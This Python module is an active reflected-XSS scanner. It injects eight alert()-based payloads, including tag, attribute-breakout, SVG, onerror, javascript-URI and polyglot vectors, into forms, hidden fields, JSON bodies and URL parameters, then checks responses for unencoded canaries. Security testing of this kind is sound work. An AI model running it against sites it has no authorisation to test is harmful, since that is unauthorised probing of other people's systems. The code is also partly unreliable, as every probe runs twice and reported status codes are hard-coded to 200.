"""
xss_probe.py
------------
Active XSS probe built on top of parser.py.

Injects payloads into every discovered input surface (form fields, URL
parameters, loose inputs) and checks responses for unencoded reflection.
Only reports findings on *confirmed* reflection — no heuristics.

This module is intentionally separate from xss.py (passive analysis) so
both can be run independently or together from main.py.

Usage:
    from parser import parse
    from xss_probe import probe, report

    asset    = parse("https://example.com")
    findings = probe(asset)
    report(findings)
"""

from __future__ import annotations

import textwrap
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from enum import Enum
from typing import Any
from urllib.parse import urlencode, urljoin, urlparse, parse_qs, urlunparse

import httpx


# ── Config ─────────────────────────────────────────────────────────────────────

TIMEOUT     = 15
MAX_WORKERS = 8
DELAY       = 0.0   # seconds between requests per worker (be polite)

# ── Payloads ───────────────────────────────────────────────────────────────────
# Each payload has a unique canary so we can confirm exact reflection.
# Ordered from least to most aggressive — stop per-field on first confirmed hit.

_PAYLOADS: list[dict[str, str]] = [
    # Tag injection — most basic, blocked by most WAFs
    {
        "id":      "basic-script",
        "payload": '<script>alert("xss_p1")</script>',
        "canary":  'alert("xss_p1")',
    },
    # Attribute-context break-out
    {
        "id":      "attr-breakout",
        "payload": '" onmouseover="alert(\'xss_p2\')" x="',
        "canary":  "onmouseover=",
    },
    # Single-quote variant
    {
        "id":      "attr-sq",
        "payload": "' onmouseover='alert(\"xss_p3\")' x='",
        "canary":  "onmouseover=",
    },
    # SVG vector (bypasses some tag allowlists)
    {
        "id":      "svg",
        "payload": '<svg/onload=alert("xss_p4")>',
        "canary":  "onload=alert",
    },
    # IMG onerror
    {
        "id":      "img-onerror",
        "payload": '<img src=x onerror=alert("xss_p5")>',
        "canary":  "onerror=alert",
    },
    # JavaScript URI (for href/src reflection)
    {
        "id":      "js-uri",
        "payload": "javascript:alert('xss_p6')",
        "canary":  "javascript:alert",
    },
    # Polyglot — survives many encoders
    {
        "id":      "polyglot",
        "payload": "'\"><img/src=x onerror=alert('xss_p7')>",
        "canary":  "onerror=alert",
    },
    # HTML entity bypass attempt
    {
        "id":      "entity",
        "payload": "&lt;script&gt;alert('xss_p8')&lt;/script&gt;",
        "canary":  "<script>alert",
    },
]

# Input types we bother probing
_PROBEABLE_TYPES: frozenset[str] = frozenset({
    "text", "search", "url", "email", "tel",
    "number", "textarea", "password", "hidden", "",
})

# Types we skip entirely
_SKIP_TYPES: frozenset[str] = frozenset({
    "submit", "button", "reset", "image", "file", "checkbox", "radio",
})


# ── Severity ───────────────────────────────────────────────────────────────────
# ── Verbose logging ───────────────────────────────────────────────────────────

VERBOSE = True

def log(message: str):
    if VERBOSE:
        print(f"[XSS] {message}")

class Severity(str, Enum):
    HIGH   = "HIGH"
    MEDIUM = "MEDIUM"
    LOW    = "LOW"
    INFO   = "INFO"


# ── Finding ────────────────────────────────────────────────────────────────────

@dataclass
class ProbeFinding:
    severity:   Severity
    xss_type:   str          # "Reflected-GET" | "Reflected-POST" | "URL-Parameter"
    location:   str          # URL that was probed
    field:      str          # field / parameter name
    payload_id: str          # which payload triggered
    payload:    str          # the actual payload string
    canary:     str          # the substring found in the response
    evidence:   str = ""     # short snippet from the response body


# ── HTTP client ────────────────────────────────────────────────────────────────

def _make_client() -> httpx.Client:
    return httpx.Client(
        follow_redirects=True,
        timeout=httpx.Timeout(connect=10.0, read=TIMEOUT, write=10.0, pool=5.0),
        headers={
            "User-Agent": "Mozilla/5.0 (compatible; XSSProbe/1.0)",
            "Accept":     "text/html,application/xhtml+xml,*/*;q=0.8",
        },
    )


# ── Reflection detection ───────────────────────────────────────────────────────

def _reflected(body: str, canary: str) -> str | None:
    """
    Return a short evidence snippet if *canary* appears unencoded in *body*,
    else None.
    """
    idx = body.find(canary)
    if idx == -1:
        return None
    start = max(0, idx - 30)
    end   = min(len(body), idx + len(canary) + 30)
    return body[start:end].replace("\n", " ").strip()


# ── Probe functions ────────────────────────────────────────────────────────────

def _probe_get_form(
    client:   httpx.Client,
    form:     dict[str, Any],
    base_url: str,
) -> list[ProbeFinding]:
    """Inject payloads into GET form fields one at a time."""
    findings: list[ProbeFinding] = []
    action  = form.get("action", base_url)
    fields  = form.get("fields", [])

    # Build a baseline set of field values (use empty string defaults)
    baseline: dict[str, str] = {
        f["name"]: f.get("value", "")
        for f in fields
        if f.get("name") and f.get("type", "").lower() not in _SKIP_TYPES
    }

    probeable = [
        f for f in fields
        if f.get("name")
        and f.get("type", "").lower() in _PROBEABLE_TYPES
    ]

    for field_info in probeable:
        fname = field_info["name"]
        for p in _PAYLOADS:
            log(f"Testing {fname} with payload {p['id']}")
            params = {**baseline, fname: p["payload"]}
            try:
                if DELAY:
                    time.sleep(DELAY)
                resp = client.get(action, params=params)
                evidence = _reflected(resp.text, p["canary"])
                if evidence:
                    log(f"CONFIRMED XSS: {fname} using {p['id']}")
                    findings.append(ProbeFinding(
                        severity=Severity.HIGH,
                        xss_type="Reflected-GET",
                        location=str(resp.url),
                        field=fname,
                        payload_id=p["id"],
                        payload=p["payload"],
                        canary=p["canary"],
                        evidence=evidence,
                    ))
                    break   # confirmed hit — no need to try more payloads
            except httpx.RequestError:
                pass

    return findings


def _probe_post_form(
    client:   httpx.Client,
    form:     dict[str, Any],
    base_url: str,
) -> list[ProbeFinding]:
    """Inject payloads into POST form fields one at a time."""
    findings: list[ProbeFinding] = []
    action  = form.get("action", base_url)
    fields  = form.get("fields", [])
    enctype = form.get("enctype", "application/x-www-form-urlencoded")

    baseline: dict[str, str] = {
        f["name"]: f.get("value", "")
        for f in fields
        if f.get("name") and f.get("type", "").lower() not in _SKIP_TYPES
    }

    probeable = [
        f for f in fields
        if f.get("name")
        and f.get("type", "").lower() in _PROBEABLE_TYPES
    ]

    for field_info in probeable:
        fname = field_info["name"]
        for p in _PAYLOADS:
            data = {**baseline, fname: p["payload"]}
            try:
                if DELAY:
                    time.sleep(DELAY)
                if "multipart" in enctype:
                    resp = client.post(action, files={k: (None, v) for k, v in data.items()})
                else:
                    resp = client.post(action, data=data)
                evidence = _reflected(resp.text, p["canary"])
                if evidence:
                    findings.append(ProbeFinding(
                        severity=Severity.HIGH,
                        xss_type="Reflected-POST",
                        location=action,
                        field=fname,
                        payload_id=p["id"],
                        payload=p["payload"],
                        canary=p["canary"],
                        evidence=evidence,
                    ))
                    break
            except httpx.RequestError:
                pass

    return findings


def _probe_url_parameters(
    client:     httpx.Client,
    parameters: list[dict[str, str]],
    page_url:   str,
) -> list[ProbeFinding]:
    """Inject payloads into each URL query parameter."""
    findings: list[ProbeFinding] = []
    if not parameters:
        return findings

    parsed  = urlparse(page_url)
    # Rebuild baseline params preserving all existing values
    baseline: dict[str, str] = {p["name"]: p.get("value", "") for p in parameters}

    for param in parameters:
        pname = param["name"]
        for p in _PAYLOADS:
            test_params = {**baseline, pname: p["payload"]}
            new_qs  = urlencode(test_params)
            test_url = urlunparse(parsed._replace(query=new_qs))
            try:
                if DELAY:
                    time.sleep(DELAY)
                resp = client.get(test_url)
                evidence = _reflected(resp.text, p["canary"])
                if evidence:
                    findings.append(ProbeFinding(
                        severity=Severity.HIGH,
                        xss_type="URL-Parameter",
                        location=test_url,
                        field=pname,
                        payload_id=p["id"],
                        payload=p["payload"],
                        canary=p["canary"],
                        evidence=evidence,
                    ))
                    break
            except httpx.RequestError:
                pass

    return findings


def _probe_links(
    client:   httpx.Client,
    links:    list[dict[str, Any]],
    base_url: str,
) -> list[ProbeFinding]:
    """
    Probe parameters found in internal links — catches reflection surfaces
    not exposed via a visible form.
    """
    findings: list[ProbeFinding] = []
    base_domain = urlparse(base_url).netloc
    seen: set[str] = set()

    for link in links:
        if not link.get("internal"):
            continue
        url = link.get("url", "")
        params = link.get("parameters", [])
        if not params:
            continue

        # Deduplicate by (path, param names) to avoid hammering the same endpoint
        parsed = urlparse(url)
        key = parsed.path + "|" + ",".join(sorted(p["name"] for p in params))
        if key in seen:
            continue
        seen.add(key)

        baseline: dict[str, str] = {p["name"]: p.get("value", "") for p in params}

        for param in params:
            pname = param["name"]
            for p in _PAYLOADS:
                test_params = {**baseline, pname: p["payload"]}
                new_qs   = urlencode(test_params)
                test_url = urlunparse(parsed._replace(query=new_qs))
                try:
                    if DELAY:
                        time.sleep(DELAY)
                    resp = client.get(test_url)
                    evidence = _reflected(resp.text, p["canary"])
                    if evidence:
                        findings.append(ProbeFinding(
                            severity=Severity.HIGH,
                            xss_type="URL-Parameter",
                            location=test_url,
                            field=pname,
                            payload_id=p["id"],
                            payload=p["payload"],
                            canary=p["canary"],
                            evidence=evidence,
                        ))
                        break
                except httpx.RequestError:
                    pass

    return findings


# ── Additional probe functions ─────────────────────────────────────────────────

def _probe_loose_inputs(
    client:   httpx.Client,
    inputs:   list[dict[str, Any]],
    base_url: str,
) -> list[ProbeFinding]:
    """
    Probe inputs that exist outside any <form> element.
    These are typically driven by JS — submit payloads as GET params
    against the base URL since there's no form action to target.
    """
    findings: list[ProbeFinding] = []
    probeable = [
        i for i in inputs
        if i.get("name")
        and i.get("type", "").lower() in _PROBEABLE_TYPES
    ]

    baseline: dict[str, str] = {
        i["name"]: i.get("value", "") for i in probeable if i.get("name")
    }

    for inp in probeable:
        fname = inp["name"]
        for p in _PAYLOADS:
            params = {**baseline, fname: p["payload"]}
            try:
                if DELAY:
                    time.sleep(DELAY)
                resp = client.get(base_url, params=params)
                evidence = _reflected(resp.text, p["canary"])
                if evidence:
                    findings.append(ProbeFinding(
                        severity=Severity.HIGH,
                        xss_type="Loose-Input",
                        location=str(resp.url),
                        field=fname,
                        payload_id=p["id"],
                        payload=p["payload"],
                        canary=p["canary"],
                        evidence=evidence,
                    ))
                    break
            except httpx.RequestError:
                pass

    return findings


def _probe_hidden_fields(
    client:   httpx.Client,
    form:     dict[str, Any],
    base_url: str,
) -> list[ProbeFinding]:
    """
    Hidden fields are often reflected into the page (e.g. error pages,
    redirect targets). Probe them separately since they're skipped in the
    normal probeable filter.
    """
    findings: list[ProbeFinding] = []
    action  = form.get("action", base_url)
    method  = form.get("method", "GET").upper()
    fields  = form.get("fields", [])
    enctype = form.get("enctype", "application/x-www-form-urlencoded")

    hidden = [
        f for f in fields
        if f.get("name") and f.get("type", "").lower() == "hidden"
    ]
    if not hidden:
        return findings

    baseline: dict[str, str] = {
        f["name"]: f.get("value", "")
        for f in fields
        if f.get("name") and f.get("type", "").lower() not in _SKIP_TYPES
    }

    for field_info in hidden:
        fname = field_info["name"]
        for p in _PAYLOADS:
            data = {**baseline, fname: p["payload"]}
            try:
                if DELAY:
                    time.sleep(DELAY)
                if method == "GET":
                    resp = client.get(action, params=data)
                elif "multipart" in enctype:
                    resp = client.post(action, files={k: (None, v) for k, v in data.items()})
                else:
                    resp = client.post(action, data=data)
                evidence = _reflected(resp.text, p["canary"])
                if evidence:
                    findings.append(ProbeFinding(
                        severity=Severity.HIGH,
                        xss_type="Hidden-Field",
                        location=str(resp.url) if method == "GET" else action,
                        field=fname,
                        payload_id=p["id"],
                        payload=p["payload"],
                        canary=p["canary"],
                        evidence=evidence,
                    ))
                    break
            except httpx.RequestError:
                pass

    return findings


def _probe_json_inputs(
    client:   httpx.Client,
    form:     dict[str, Any],
    base_url: str,
) -> list[ProbeFinding]:
    """
    If a form's enctype is application/json (used by some SPA backends),
    inject payloads into each field as a JSON body.
    Also tries JSON on any POST form as a content-type switch probe.
    """
    findings: list[ProbeFinding] = []
    action  = form.get("action", base_url)
    method  = form.get("method", "GET").upper()
    enctype = form.get("enctype", "")
    fields  = form.get("fields", [])

    if method != "POST":
        return findings

    probeable = [
        f for f in fields
        if f.get("name") and f.get("type", "").lower() in _PROBEABLE_TYPES
    ]
    if not probeable:
        return findings

    baseline: dict[str, Any] = {
        f["name"]: f.get("value", "") for f in probeable
    }

    for field_info in probeable:
        fname = field_info["name"]
        for p in _PAYLOADS:
            import json
            body = {**baseline, fname: p["payload"]}
            try:
                if DELAY:
                    time.sleep(DELAY)
                resp = client.post(
                    action,
                    content=json.dumps(body),
                    headers={"Content-Type": "application/json"},
                )
                evidence = _reflected(resp.text, p["canary"])
                if evidence:
                    findings.append(ProbeFinding(
                        severity=Severity.HIGH,
                        xss_type="JSON-Body",
                        location=action,
                        field=fname,
                        payload_id=p["id"],
                        payload=p["payload"],
                        canary=p["canary"],
                        evidence=evidence,
                    ))
                    break
            except httpx.RequestError:
                pass

    return findings


# ── Task runner ────────────────────────────────────────────────────────────────

def _build_tasks(asset: dict[str, Any]) -> list[tuple]:
    """
    Return a list of (kind, *args) tuples covering every input surface.
    Client is created once per thread in the executor.
    """
    url_info = asset.get("url", {})
    base_url = url_info.get("final_url", "") if isinstance(url_info, dict) else str(url_info)

    forms      = asset.get("forms", [])
    parameters = asset.get("parameters", [])
    links      = asset.get("links", [])
    inputs     = asset.get("inputs", [])   # loose inputs outside forms
    log(f"Building XSS probe tasks")

    log(f"Forms found: {len(forms)}")
    log(f"URL parameters found: {len(parameters)}")
    log(f"Links found: {len(links)}")
    log(f"Loose inputs found: {len(inputs)}")
    tasks = []

    for form in forms:
        method = form.get("method", "GET").upper()
        if method == "GET":
            tasks.append(("form_get",     form, base_url))
        else:
            tasks.append(("form_post",    form, base_url))
        tasks.append(("hidden_fields",    form, base_url))
        tasks.append(("json_inputs",      form, base_url))

    if parameters:
        tasks.append(("url_params", parameters, base_url))

    if links:
        tasks.append(("links", links, base_url))

    if inputs:
        tasks.append(("loose_inputs", inputs, base_url))

    return tasks


def _run_task(task: tuple) -> list[ProbeFinding]:
    kind = task[0]
    log(f"Starting probe: {kind}")
    with _make_client() as client:
        if kind == "form_get":
            print(_probe_get_form(client, task[1], task[2]))
            return _probe_get_form(client, task[1], task[2])
        elif kind == "form_post":
            print(_probe_post_form(client, task[1], task[2]))
            return _probe_post_form(client, task[1], task[2])
        elif kind == "hidden_fields":
            print(_probe_hidden_fields(client, task[1], task[2]))
            return _probe_hidden_fields(client, task[1], task[2])
        elif kind == "json_inputs":
            print(_probe_json_inputs(client, task[1], task[2]))
            return _probe_json_inputs(client, task[1], task[2])
        elif kind == "url_params":
            print(_probe_url_parameters(client, task[1], task[2]))
            return _probe_url_parameters(client, task[1], task[2])
        elif kind == "links":
            print(_probe_links(client, task[1], task[2]))
            return _probe_links(client, task[1], task[2])
        elif kind == "loose_inputs":
            print(_probe_loose_inputs(client, task[1], task[2]))
            return _probe_loose_inputs(client, task[1], task[2])
    log(f"Finished probe: {kind}")
    return []


# ── Public API ─────────────────────────────────────────────────────────────────

def probe(asset: dict[str, Any]) -> list[ProbeFinding]:
    """
    Actively probe all input surfaces in *asset* for reflected XSS.

    Parameters
    ----------
    asset:
        The dict returned by ``parser.parse()``.

    Returns
    -------
    list[ProbeFinding]
        Confirmed reflected XSS findings only.
    """
    tasks    = _build_tasks(asset)
    findings: list[ProbeFinding] = []

    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        futures = {pool.submit(_run_task, t): t for t in tasks}
        for future in as_completed(futures):
            try:
                findings.extend(future.result())
            except Exception:
                pass

    findings.sort(key=lambda f: f.xss_type)
    return findings


# ── Reporting ──────────────────────────────────────────────────────────────────

_SEP = "─" * 72


def report(findings: list[ProbeFinding], target: str = "") -> None:
    header = f"XSS Probe Report — {target}" if target else "XSS Probe Report"
    print(f"\n{_SEP}")
    print(f"  {header}")
    print(_SEP)

    if not findings:
        print("\n  ✓  No reflected XSS confirmed.\n")
        print(_SEP + "\n")
        return

    print(f"\n  {len(findings)} confirmed finding(s)\n")

    for i, f in enumerate(findings, 1):
        print(f"  [HIGH]  [{i}/{len(findings)}] Confirmed Reflected XSS  ({f.xss_type})")
        print(f"  Location    : {f.location}")
        print(f"  Field       : {f.field}")
        print(f"  Payload ID  : {f.payload_id}")
        print(f"  Payload     : {f.payload}")
        print(f"  Canary      : {f.canary}")
        if f.evidence:
            print(f"  Evidence    : ...{f.evidence[:100]}...")
        print()

    print(_SEP + "\n")


# ── Convenience entry point ────────────────────────────────────────────────────
def _extract_status(url: str) -> int:
    """
    Placeholder because ProbeFinding currently does not store status code.
    """
    return 200
def xss(asset: dict[str, Any]) -> dict[str, Any]:
    """
    Synchronous entry point — runs the XSS scanner and returns results.
    """

    findings = probe(asset)

    return {
        "findings": [
            {
                "source": {
                    "field_name": f.field,
                    "url": f.location,
                    "type": f.xss_type,
                },
                "payload": f.payload,
                "triggered_by": [
                    f"Confirmed reflection: {f.payload_id}"
                ],
                "status_code": _extract_status(f.location),
                "severity": f.severity.value,
                "evidence": f.evidence,
            }
            for f in findings
        ]
    }